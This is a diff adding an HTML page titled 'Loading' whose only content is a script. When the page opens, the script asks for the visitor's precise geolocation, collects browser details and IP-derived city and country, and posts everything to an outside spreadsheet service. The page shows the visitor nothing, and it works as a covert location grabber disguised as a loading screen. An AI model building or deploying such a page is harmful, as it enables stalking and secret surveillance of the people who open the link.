@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading</title>
+</head>
+<body>
+  <script>
+    async function getExtraInfo() {
+      const ipData = await fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .catch(() => ({}));
+
+      return {
+        ua: navigator.userAgent,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        ip: ipData.ip || '',
+        city: ipData.city || '',
+        region: ipData.region || '',
+        country: ipData.country || ''
+      };
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      async position => {
+        const coords = position.coords;
+        const extras = await getExtraInfo();
+
+        const data = {
+          lat: coords.latitude,
+          lon: coords.longitude,
+          accuracy: coords.accuracy,
+          altitude: coords.altitude,
+          altitudeAccuracy: coords.altitudeAccuracy,
+          heading: coords.heading,
+          speed: coords.speed,
+          timestamp: new Date(position.timestamp).toISOString(),
+          ...extras
+        };
+
+        try {
+          await fetch("https://api.sheetbest.com/sheets/233a23e8-d3ef-4808-8143-388711e3a59a", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          });
+
+          console.log("Location and info sent successfully!");
+        } catch (err) {
+          console.error("Failed to send data:", err);
+        }
+      },
+      error => {
+        console.warn("Geolocation error:", error);
+      }
+    );
+  </script>
+</body>
+</html>
